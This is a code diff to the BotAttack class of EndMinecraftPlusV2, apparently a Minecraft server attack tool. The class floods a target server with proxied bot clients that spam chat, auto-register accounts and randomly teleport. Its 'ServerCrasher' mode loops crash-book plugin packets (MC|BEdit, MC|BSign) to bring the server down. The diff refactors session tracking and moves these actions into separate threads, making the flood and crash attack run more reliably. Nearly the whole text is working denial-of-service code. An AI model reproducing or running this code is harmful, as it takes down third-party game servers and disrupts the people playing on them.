@@ -43,13 +43,13 @@ import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
 public class BotAttack extends IAttack {
-    public static HashMap<Client, String> clientName = new HashMap<>();
+    public static HashMap<Session, String> clientName = new HashMap<>();
     public static int failed = 0;
     public static int rejoin = 0;
     public static int clickVerifies = 0;
     public static List<String> rejoinPlayers = new ArrayList<>();
     public static List<Session> joinedPlayers = new ArrayList<>();
-    public static List<String> alivePlayers = new ArrayList<>();
+    public static List<Session> alivePlayers = new ArrayList<>();
     public static HashMap<Session,ServerPlayerPositionRotationPacket> positionPacket = new HashMap<>();
     protected boolean attack_motdbefore;
     protected boolean attack_tab;
@@ -84,38 +84,38 @@ public class BotAttack extends IAttack {
     public void start() {
         setTask(() -> {
             while (true) {
-                for (Client c : clients) {
-                    if (c.getSession().isConnected()) {
-                        if (c.getSession().hasFlag("login")) {
+                List<Session> tempList = new ArrayList<>(alivePlayers);
+
+                for (Session c:tempList) {
+                    if (c.isConnected()) {
+                        if (c.hasFlag("login")) {
                             if (ConfigUtil.ChatSpam) {
-                                c.getSession().send(new ClientChatPacket(getRandMessage(clientName.get(c))));
-                                OtherUtils.doSleep(ConfigUtil.ChatDelay);
+                                new Thread(() -> {
+                                    c.send(new ClientChatPacket(getRandMessage(clientName.get(c))));
+                                    OtherUtils.doSleep(ConfigUtil.ChatDelay);
+                                }).start();
                             }
 
                             if (ConfigUtil.RandomTeleport) {
-                                ServerPlayerPositionRotationPacket positionRotationPacket = positionPacket.get(c.getSession());
-                                if (c.getSession().isConnected() && positionRotationPacket != null) {
-                                    new Thread(() -> {
-                                        try {
-                                            MultiVersionPacket.sendPosPacket(c.getSession(), positionRotationPacket.getX() + OtherUtils.getRandomInt(-10, 10), positionRotationPacket.getY() + OtherUtils.getRandomInt(2, 8), positionRotationPacket.getZ() + OtherUtils.getRandomInt(-10, 10), OtherUtils.getRandomFloat(0.00, 1.00), OtherUtils.getRandomFloat(0.00, 1.00));
-                                            Thread.sleep(500);
-                                            MultiVersionPacket.sendPosPacket(c.getSession(), positionRotationPacket.getX(), positionRotationPacket.getY(), positionRotationPacket.getZ(), OtherUtils.getRandomFloat(0.00, 1.00), OtherUtils.getRandomFloat(0.00, 1.00));
-                                        } catch (InterruptedException e) {
-                                            throw new RuntimeException(e);
-                                        }
-                                    }).start();
-                                }
+                                new Thread(() -> {
+                                    ServerPlayerPositionRotationPacket positionRotationPacket = positionPacket.get(c);
+                                    if (c.isConnected() && positionRotationPacket != null) {
+                                        MultiVersionPacket.sendPosPacket(c, positionRotationPacket.getX() + OtherUtils.getRandomInt(-10, 10), positionRotationPacket.getY() + OtherUtils.getRandomInt(2, 8), positionRotationPacket.getZ() + OtherUtils.getRandomInt(-10, 10), OtherUtils.getRandomFloat(0.00, 1.00), OtherUtils.getRandomFloat(0.00, 1.00));
+                                        OtherUtils.doSleep(500);
+                                        MultiVersionPacket.sendPosPacket(c, positionRotationPacket.getX(), positionRotationPacket.getY(), positionRotationPacket.getZ(), OtherUtils.getRandomFloat(0.00, 1.00), OtherUtils.getRandomFloat(0.00, 1.00));
+                                    }
+                                }).start();
                             }
 
-                            if (ConfigUtil.ServerCrasher && !c.getSession().hasFlag("crasher")) {
-                                c.getSession().setFlag("crasher", true);
+                            if (ConfigUtil.ServerCrasher && !c.hasFlag("crasher")) {
+                                new Thread(() -> {
+                                    c.setFlag("crasher", true);
 
-                                switch (ConfigUtil.ServerCrasherMode) {
-                                    case 1:
-                                        new Thread(() -> {
+                                    switch (ConfigUtil.ServerCrasherMode) {
+                                        case 1:
                                             LogUtil.doLog(0, "[" + clientName.get(c) + "] 开始发送Crash Packet...", "ServerCrasher");
 
-                                            while (true) {
+                                            while (c.isConnected()) {
                                                 try {
                                                     ItemStack crashBook = getCrashBook();
 
@@ -130,30 +130,39 @@ public class BotAttack extends IAttack {
 
                                                     byte[] crashData = buf.toByteArray();
 
-                                                    c.getSession().send(new ClientPluginMessagePacket("MC|BEdit", crashData));
-                                                    c.getSession().send(new ClientPluginMessagePacket("MC|BSign", crashData));
+                                                    c.send(new ClientPluginMessagePacket("MC|BEdit", crashData));
+                                                    c.send(new ClientPluginMessagePacket("MC|BSign", crashData));
 
-                                                    Thread.sleep(ConfigUtil.ServerCrasherPacketDelay);
+                                                    OtherUtils.doSleep(ConfigUtil.ServerCrasherPacketDelay);
                                                 } catch (Exception ignored) {}
                                             }
-                                        }).start();
-                                        break;
-                                    default:
-                                }
+
+                                            break;
+                                        default:
+                                    }
+                                }).start();
                             }
-                        } else if (c.getSession().hasFlag("join")) {
+                        } else {
                             if (ConfigUtil.RegisterAndLogin) {
-                                for (String cmd:ConfigUtil.RegisterCommands) {
-                                    OtherUtils.doSleep(ConfigUtil.ChatDelay);
-                                    c.getSession().send(new ClientChatPacket(cmd.replace("$pwd",DataUtil.botRegPasswordsMap.get(clientName.get(c)))));
-                                }
-                                LogUtil.doLog(0, "[" + clientName.get(c) + "] 注册信息已发送。", "BotAttack");
+                                try {
+                                    for (String cmd:ConfigUtil.RegisterCommands) {
+                                        OtherUtils.doSleep(ConfigUtil.ChatDelay);
+                                        c.send(new ClientChatPacket(cmd.replace("$pwd",DataUtil.botRegPasswordsMap.get(clientName.get(c)))));
+                                    }
+
+                                    LogUtil.doLog(0, "[" + clientName.get(c) + "] 注册信息已发送。", "BotAttack");
+
+                                    c.setFlag("login", true);
+                                } catch (Exception ignored) {}
+                            } else {
+                                c.setFlag("login", true);
                             }
 
-                            c.getSession().setFlag("login", true);
                         }
                     }
                 }
+
+                OtherUtils.doSleep(1000);
             }
         });
 
@@ -220,16 +229,14 @@ public class BotAttack extends IAttack {
 
     private void cleanClients() {
         for (Client client:clients) {
-            String username = clientName.get(client);
-
             if (!client.getSession().isConnected()) {
                 positionPacket.remove(client.getSession());
-                alivePlayers.remove(username);
-                clientName.remove(client);
+                alivePlayers.remove(client.getSession());
+                clientName.remove(client.getSession());
                 clients.remove(client);
             } else {
-                if (!alivePlayers.contains(username) && (client.getSession().hasFlag("login") || client.getSession().hasFlag("join"))) {
-                    alivePlayers.add(username);
+                if (!alivePlayers.contains(client.getSession()) && (client.getSession().hasFlag("login") || client.getSession().hasFlag("join"))) {
+                    alivePlayers.add(client.getSession());
                 }
             }
         }
@@ -248,39 +255,37 @@ public class BotAttack extends IAttack {
                 break;
         }
 
-        for (String p: ProxyUtil.proxies) {
-            try {
-                if (!EndMinecraftPlusV2.isLinux) {
-                    SetTitle.INSTANCE.SetConsoleTitleA("EndMinecraftPlusV2 - BotAttack | 当前连接数: " + clients.size() + "个 | 失败次数: " + failed + "次 | 成功加入: " + joinedPlayers.size() + "次 | 当前存活: " + alivePlayers.size() + "个 | 点击验证: " + clickVerifies + "次 | 重进尝试: " + rejoin);
-                }
-
-                String[] _p = p.split(":");
-                Proxy proxy = new Proxy(proxyType, new InetSocketAddress(_p[0], Integer.parseInt(_p[1])));
-                String[] User = AttackManager.getRandomUser().split("@");
-                Client client = createClient(ip, port, User[0], proxy);
-                client.getSession().setReadTimeout(Math.toIntExact(ConfigUtil.ConnectTimeout));
-                client.getSession().setWriteTimeout(Math.toIntExact(ConfigUtil.ConnectTimeout));
-                clientName.put(client, User[0]);
-                clients.add(client);
-                ProxyUtil.clientsProxy.put(client.getSession(), proxy);
-
-                pool.submit(() -> {
-                    if (this.attack_motdbefore) {
-                        getMotd(proxy, ip, port);
+        while (clients.size() > this.attack_maxconnect) {
+            for (String p: ProxyUtil.proxies) {
+                try {
+                    if (!EndMinecraftPlusV2.isLinux) {
+                        SetTitle.INSTANCE.SetConsoleTitleA("EndMinecraftPlusV2 - BotAttack | 当前连接数: " + clients.size() + "个 | 失败次数: " + failed + "次 | 成功加入: " + joinedPlayers.size() + "次 | 当前存活: " + alivePlayers.size() + "个 | 点击验证: " + clickVerifies + "次 | 重进尝试: " + rejoin);
                     }
 
-                    client.getSession().connect(false);
-                });
+                    String[] _p = p.split(":");
+                    Proxy proxy = new Proxy(proxyType, new InetSocketAddress(_p[0], Integer.parseInt(_p[1])));
+                    String[] User = AttackManager.getRandomUser().split("@");
+                    Client client = createClient(ip, port, User[0], proxy);
+                    client.getSession().setReadTimeout(Math.toIntExact(ConfigUtil.ConnectTimeout));
+                    client.getSession().setWriteTimeout(Math.toIntExact(ConfigUtil.ConnectTimeout));
+                    clientName.put(client.getSession(), User[0]);
+                    clients.add(client);
+                    ProxyUtil.clientsProxy.put(client.getSession(), proxy);
 
-                if (this.attack_joinsleep > 0) {
-                    OtherUtils.doSleep(attack_joinsleep);
-                }
+                    pool.submit(() -> {
+                        if (this.attack_motdbefore) {
+                            getMotd(proxy, ip, port);
+                        }
 
-                if (clients.size() > this.attack_maxconnect) {
-                    break;
+                        client.getSession().connect(false);
+                    });
+
+                    if (this.attack_joinsleep > 0) {
+                        OtherUtils.doSleep(attack_joinsleep);
+                    }
+                } catch (Exception e) {
+                    LogUtil.doLog(1, "发生错误: " + e, null);
                 }
-            } catch (Exception e) {
-                LogUtil.doLog(1, "发生错误: " + e, null);
             }
         }
     }
@@ -310,6 +315,8 @@ public class BotAttack extends IAttack {
                 if (ConfigUtil.SaveWorkingProxy) {
                     ProxyUtil.saveWorkingProxy(proxy);
                 }
+
+                clientName.put(client.getSession(), username);
             }
 
             public void disconnecting(DisconnectingEvent e) {
@@ -340,7 +347,7 @@ public class BotAttack extends IAttack {
 
                                     rejoin++;
                                     LogUtil.doLog(0,"[假人尝试重连] [" + username + "] [" + proxy + "]", "BotAttack");
-                                    clientName.put(rejoinClient, username);
+                                    clientName.put(rejoinClient.getSession(), username);
                                     clients.add(rejoinClient);
                                     rejoinClient.getSession().connect(false);
                                     ProxyUtil.clientsProxy.put(client.getSession(), proxy);
@@ -361,7 +368,7 @@ public class BotAttack extends IAttack {
                     }
 
                     failed++;
-                    alivePlayers.remove(username);
+                    alivePlayers.remove(client.getSession());
                 }).start();
             }
         });
@@ -441,8 +448,8 @@ public class BotAttack extends IAttack {
 
             joinedPlayers.add(session);
 
-            if (!alivePlayers.contains(username)) {
-                alivePlayers.add(username);
+            if (!alivePlayers.contains(session)) {
+                alivePlayers.add(session);
             }
 
             MultiVersionPacket.sendClientSettingPacket(session, "zh_CN");
@@ -469,10 +476,6 @@ public class BotAttack extends IAttack {
                 joinedPlayers.add(session);
             }
 
-            if (!alivePlayers.contains(username)) {
-                alivePlayers.add(username);
-            }
-
             if (ConfigUtil.ShowServerMessages && !message.getFullText().equals("")) {
                 LogUtil.doLog(0, "[服务端返回信息] [" + username + "] " + message.getFullText(), "BotAttack");
             }
@@ -481,10 +484,6 @@ public class BotAttack extends IAttack {
             // session.send(keepAlivePacket);
             if (!joinedPlayers.contains(session)) {
                 joinedPlayers.add(session);
-            }
-
-            if (!alivePlayers.contains(username)) {
-                alivePlayers.add(username);
             }
         }
     }
